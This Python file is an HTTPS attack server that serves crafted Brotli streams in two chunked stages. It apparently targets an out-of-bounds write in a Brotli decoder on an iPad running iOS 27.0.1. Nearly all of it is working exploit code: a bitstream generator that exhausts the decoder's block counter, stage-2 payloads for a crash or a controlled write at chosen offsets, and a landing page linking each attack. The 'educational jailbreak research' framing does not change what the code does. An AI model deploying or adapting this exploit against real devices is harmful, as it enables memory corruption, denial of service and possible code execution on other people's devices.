#!/usr/bin/env python3
"""Two-stage chunked transfer Brotli attack server for CVE-2026-111497.

Serves crafted Brotli streams over HTTPS using Transfer-Encoding: chunked.
Stage 1: trigger stream that exhausts block counter (~55KB)
Stage 2: crafted bytes read by decoder as block switch data -> controlled OOB write

Educational jailbreak research only. For use on devices you own.
"""

import hashlib
import io
import os
import socket
import ssl
import struct
import sys
import threading
import time

# --- Brotli trigger generation (exact dimas bitstream, confirmed working) ---

class BitWriter:
    def __init__(self):
        self.buffer = io.BytesIO()
        self.current_byte = 0
        self.bit_pos = 0

    def write_bits(self, value, num_bits):
        for i in range(num_bits):
            if value & (1 << i):
                self.current_byte |= (1 << self.bit_pos)
            self.bit_pos += 1
            if self.bit_pos == 8:
                self.buffer.write(bytes([self.current_byte]))
                self.current_byte = 0
                self.bit_pos = 0

    def flush(self):
        if self.bit_pos > 0:
            self.buffer.write(bytes([self.current_byte]))
            self.current_byte = 0
            self.bit_pos = 0

    def getvalue(self):
        self.flush()
        return self.buffer.getvalue()


def write_simple_prefix(w, code, value):
    if value == 1:
        w.write_bits(0, 1)
    else:
        w.write_bits(1, 1)
        w.write_bits(value - 2, code)


def write_single_symbol_tree(w, alphabet_bits, symbol):
    w.write_bits(1, 2)  # HTREE type = single symbol
    if symbol == 0:
        w.write_bits(0, 1)  # max_bits indicator
        w.write_bits(0, alphabet_bits)
    else:
        nsym_minus_1 = 0
        w.write_bits(nsym_minus_1, 1)
        w.write_bits(symbol, alphabet_bits)


def craft_trigger(command_count=40000):
    """Generate trigger stream - exact dimas bitstream with configurable command count.
    Uses NBLTYPESI=2 with symbol 25 (13 extra bits) for block length."""
    w = BitWriter()

    # Window size: WBITS=17 (1MB window)
    w.write_bits(0b0100001, 7)

    # Data meta-block header
    w.write_bits(0, 1)  # ISLAST=0
    w.write_bits(0b10, 2)  # MNIBBLES=2
    mlen_minus1 = 0xFFFFFF
    w.write_bits(mlen_minus1 & 0xFFF, 12)
    w.write_bits((mlen_minus1 >> 12) & 0xFFF, 12)

    # NBLTYPESL=1 (1 literal block type)
    write_simple_prefix(w, 1, 1)

    # NBLTYPESI=2 (2 insert/copy block types) - KEY for the exploit
    write_simple_prefix(w, 1, 2)

    # Command block type tree: 1-symbol (symbol 0)
    write_single_symbol_tree(w, 1, 0)

    # Command block length tree: 1-symbol (symbol 25)
    # Symbol 25 has 13 extra bits, base=24577, range up to 32768
    write_single_symbol_tree(w, 5, 25)

    # Block length extra bits for symbol 25: 13 bits
    # Value 0x1FFF = 8191, so block_length = 24577 + 8191 = 32768
    w.write_bits(0x1FFF, 13)

    # NBLTYPESD=1 (1 distance block type)
    write_simple_prefix(w, 1, 1)

    # NDIRECT=0, NPOSTFIX=0
    w.write_bits(0, 2)  # NPOSTFIX
    w.write_bits(0, 4)  # NDIRECT >> NPOSTFIX

    # Context modes for literal types: LSB6
    w.write_bits(0, 2)

    # NTREESL=1
    write_simple_prefix(w, 1, 1)

    # Literal Huffman tree: single symbol (ASCII 'H' = 0x48)
    write_single_symbol_tree(w, 8, 0x48)

    # Insert-and-copy length tree: single symbol
    # Symbol 2 = insert length 0, copy length 4
    write_single_symbol_tree(w, 10, 2)

    # Distance tree: single symbol (symbol 0 = last distance)
    write_single_symbol_tree(w, 6, 0)

    # Now emit commands to exhaust the block counter
    # Each command is: insert-and-copy (0 bits, single symbol) + distance (0 bits, single symbol)
    # = 11 bits per command (from the 1-symbol trees that absorb bits)
    # With block_length=32768, we need ~32768 commands to exhaust
    # Using command_count=40000 to ensure exhaustion with margin
    for _ in range(command_count):
        w.write_bits(0, 11)

    return w.getvalue()


def build_stage1(command_count=40000):
    """Stage 1: trigger stream + 3 null byte padding (matches dimas trigger_stages)."""
    trigger = craft_trigger(command_count)
    return trigger + b"\x00" * 3


def build_stage2_crash():
    """Stage 2 for crash/DoS: 0x7FFFFFFF at all positions (max OOB offset).
    Matches dimas trigger_stages() exactly."""
    second = bytearray(127)
    second[7] = 8
    struct.pack_into("<i", second, 15, 0x7FFFFFFF)
    struct.pack_into("<I", second, 19, 0x7FFFFFFF)
    struct.pack_into("<I", second, 23, 0x7FFFFFFF)
    return bytes(second)


def build_stage2_controlled(pos):
    """Stage 2 for controlled OOB write at specific position.
    Matches dimas rce_stage_two(pos, size=127)."""
    body = bytearray(127)
    body[7] = 8
    struct.pack_into("<i", body, 15, pos)
    struct.pack_into("<I", body, 19, 0x7FFFFFFF)
    struct.pack_into("<I", body, 23, 0x7FFFFFFF)
    return bytes(body)


# --- HTTP chunked encoding ---

def chunk(data):
    """Wrap data in HTTP chunked encoding format."""
    return f"{len(data):x}\r\n".encode("ascii") + data + b"\r\n"


def chunk_end():
    """Terminal chunk."""
    return b"0\r\n\r\n"


# --- SSL/TLS setup ---

def create_ssl_context(certfile, keyfile):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile, keyfile)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    return ctx


def ensure_cert(cert_dir):
    """Generate self-signed cert if not present."""
    certfile = os.path.join(cert_dir, "server.crt")
    keyfile = os.path.join(cert_dir, "server.key")
    if os.path.exists(certfile) and os.path.exists(keyfile):
        return certfile, keyfile

    import subprocess
    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
        "-keyout", keyfile, "-out", certfile,
        "-days", "365", "-subj", "/CN=192.168.1.155",
        "-addext", "subjectAltName=IP:192.168.1.155"
    ], check=True)
    return certfile, keyfile


# --- Server ---

LANDING = """<!DOCTYPE html>
<html>
<head><title>CVE-2026-111497 Two-Stage Attack</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: system-ui; max-width: 700px; margin: 2em auto; padding: 0 1em;
       background: #111; color: #eee; }
h1 { color: #f44; }
h2 { color: #fa0; margin-top: 2em; }
a { color: #4af; font-size: 1.2em; display: block; margin: 0.8em 0;
    padding: 12px 16px; background: #222; border-radius: 8px; text-decoration: none; }
a:hover { background: #333; }
.info { color: #888; font-size: 0.9em; }
.warn { color: #f80; background: #331800; padding: 12px; border-radius: 8px; margin: 1em 0; }
.ok { color: #0f0; }
.section { border-top: 1px solid #333; padding-top: 1em; }
code { background: #222; padding: 2px 6px; border-radius: 3px; }
</style>
</head>
<body>
<h1>CVE-2026-111497 Two-Stage Attack</h1>
<p class="warn">Educational jailbreak research. Two-stage chunked transfer delivery
of Brotli OOB write exploit. Stage 1 exhausts block counter, stage 2 controls the
block switch data for targeted corruption.</p>

<h2>Two-Stage Attacks (Chunked Transfer)</h2>
<p class="info">These use <code>Transfer-Encoding: chunked</code> to deliver
stage 1 (trigger) and stage 2 (block switch control) with a delay between them.</p>

<a href="/staged/crash">STAGED: Crash (0x7FFFFFFF offset) - 500ms delay</a>
<a href="/staged/crash-1s">STAGED: Crash - 1000ms delay</a>
<a href="/staged/controlled/256">STAGED: Controlled OOB at pos=256</a>
<a href="/staged/controlled/4096">STAGED: Controlled OOB at pos=4096</a>
<a href="/staged/controlled/-128">STAGED: Controlled OOB at pos=-128 (backward)</a>

<div class="section">
<h2>Single-Shot Reference (No Staging)</h2>
<p class="info">Confirmed working trigger served as single response for comparison.</p>
<a href="/br/small">SINGLE: Small trigger (55KB, confirmed)</a>
</div>

<div class="section">
<h2>Stage Analysis</h2>
<p class="info">Download raw stage bytes for offline analysis.</p>
<a href="/raw/stage1">RAW: Stage 1 bytes (trigger + padding)</a>
<a href="/raw/stage2-crash">RAW: Stage 2 bytes (crash variant)</a>
</div>

<p class="info" style="margin-top: 2em;">
Server: brotli_staged_server.py | Target: iPad Mini iOS 27.0.1<br>
Exploit: CVE-2026-111497 Brotli DecodeBlockTypeAndLength OOB Write<br>
Stage 1: ~55KB (40000 commands, NBLTYPESI=2, symbol 25 block length)<br>
Stage 2: 127 bytes (block switch control at offsets 7, 15, 19, 23)
</p>
</body>
</html>"""


def handle_client(ssl_sock, addr, stage1, stage2_crash):
    """Handle a single client connection."""
    try:
        ssl_sock.settimeout(10)
        request = ssl_sock.recv(8192)
        if not request:
            return

        req_line = request.split(b"\r\n")[0].decode("utf-8", errors="replace")
        method, path, *_ = req_line.split(" ", 2)
        print(f"[{addr[0]}:{addr[1]}] {method} {path}")

        if path == "/":
            body = LANDING.encode("utf-8")
            resp = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/html; charset=utf-8\r\n"
                + f"Content-Length: {len(body)}\r\n".encode()
                + b"Connection: close\r\n\r\n"
                + body
            )
            ssl_sock.sendall(resp)

        elif path.startswith("/staged/"):
            parts = path.split("/")
            # /staged/crash, /staged/crash-1s, /staged/controlled/<pos>
            delay = 0.5
            stage2 = stage2_crash

            if len(parts) >= 3 and parts[2] == "crash-1s":
                delay = 1.0
            elif len(parts) >= 3 and parts[2] == "crash":
                delay = 0.5
            elif len(parts) >= 4 and parts[2] == "controlled":
                try:
                    pos = int(parts[3])
                    stage2 = build_stage2_controlled(pos)
                except (ValueError, IndexError):
                    stage2 = stage2_crash

            print(f"  -> STAGED ATTACK: delay={delay}s, stage2={len(stage2)}B")

            # Send response headers with chunked transfer + brotli encoding
            headers = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/html; charset=utf-8\r\n"
                b"Content-Encoding: br\r\n"
                b"Transfer-Encoding: chunked\r\n"
                b"Connection: close\r\n"
                b"Cache-Control: no-store\r\n\r\n"
            )
            ssl_sock.sendall(headers)

            # Stage 1: send trigger as first chunk
            print(f"  -> Sending stage 1: {len(stage1)} bytes")
            ssl_sock.sendall(chunk(stage1))

            # Delay: let decoder process stage 1 and exhaust block counter
            print(f"  -> Waiting {delay}s for block counter exhaustion...")
            time.sleep(delay)

            # Stage 2: send crafted block switch bytes as second chunk + terminal
            print(f"  -> Sending stage 2: {len(stage2)} bytes")
            ssl_sock.sendall(chunk(stage2) + chunk_end())
            print(f"  -> Attack sequence complete")

        elif path == "/br/small":
            # Single-shot confirmed trigger (no staging, for comparison)
            trigger = craft_trigger(40000)
            headers = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/html; charset=utf-8\r\n"
                b"Content-Encoding: br\r\n"
                + f"Content-Length: {len(trigger)}\r\n".encode()
                + b"Connection: close\r\n"
                b"Cache-Control: no-store\r\n\r\n"
            )
            ssl_sock.sendall(headers + trigger)

        elif path == "/raw/stage1":
            ssl_sock.sendall(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/octet-stream\r\n"
                b"Content-Disposition: attachment; filename=stage1.bin\r\n"
                + f"Content-Length: {len(stage1)}\r\n".encode()
                + b"Connection: close\r\n\r\n"
                + stage1
            )

        elif path == "/raw/stage2-crash":
            ssl_sock.sendall(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/octet-stream\r\n"
                b"Content-Disposition: attachment; filename=stage2-crash.bin\r\n"
                + f"Content-Length: {len(stage2_crash)}\r\n".encode()
                + b"Connection: close\r\n\r\n"
                + stage2_crash
            )

        else:
            body = b"404 Not Found\n"
            ssl_sock.sendall(
                b"HTTP/1.1 404 Not Found\r\n"
                b"Content-Type: text/plain\r\n"
                + f"Content-Length: {len(body)}\r\n".encode()
                + b"Connection: close\r\n\r\n"
                + body
            )

    except (ssl.SSLError, OSError, BrokenPipeError) as e:
        print(f"  -> Connection error: {e}")
    finally:
        try:
            ssl_sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        ssl_sock.close()


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4447
    cert_dir = os.path.dirname(os.path.abspath(__file__))

    certfile, keyfile = ensure_cert(cert_dir)
    ssl_ctx = create_ssl_context(certfile, keyfile)

    print("Generating stage 1 (trigger, 40000 commands)...")
    stage1 = build_stage1(40000)
    print(f"  Stage 1 ready: {len(stage1)} bytes")
    print(f"  SHA256: {hashlib.sha256(stage1).hexdigest()}")

    stage2_crash = build_stage2_crash()
    print(f"  Stage 2 (crash): {len(stage2_crash)} bytes")
    print(f"  Stage 2 hex[0:28]: {stage2_crash[:28].hex()}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", port))
    sock.listen(5)

    print(f"\nTwo-stage Brotli attack server running on https://0.0.0.0:{port}/")
    print(f"Landing page: https://192.168.1.155:{port}/")
    print(f"Staged crash: https://192.168.1.155:{port}/staged/crash")
    print("Waiting for connections...\n")

    while True:
        try:
            client_sock, addr = sock.accept()
            try:
                ssl_sock = ssl_ctx.wrap_socket(client_sock, server_side=True)
            except ssl.SSLError as e:
                print(f"[{addr[0]}] SSL handshake failed: {e}")
                client_sock.close()
                continue

            t = threading.Thread(target=handle_client,
                                 args=(ssl_sock, addr, stage1, stage2_crash),
                                 daemon=True)
            t.start()
        except KeyboardInterrupt:
            print("\nShutting down...")
            break

    sock.close()


if __name__ == "__main__":
    main()
